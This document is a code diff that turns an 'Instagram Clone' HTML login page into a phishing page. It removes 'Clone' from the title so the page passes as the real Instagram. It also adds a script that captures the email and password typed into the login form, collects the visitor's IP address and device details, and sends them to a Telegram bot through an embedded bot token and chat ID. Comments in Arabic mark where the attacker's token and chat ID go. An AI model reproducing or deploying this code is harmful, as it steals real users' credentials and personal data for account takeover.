@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram Clone</title>
+    <title>Instagram</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -65,16 +65,55 @@
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
         </ul>
-        <p class="copyright">© 2020 Instagram from Facebook</p>
+        <p class="copyright">© 2025 Instagram from Facebook</p>
     </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "6688148390:AAE7vUvZpWvBhPXrmsnI5stDP4dFw3EU5yo";                                                            // هنا التوكين              
+    const CHAT_ID = "6398477299";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
 
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
 
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
 
-<!-- java هنا اسفل -->
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
 
-
-
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
 </body>
 </html>
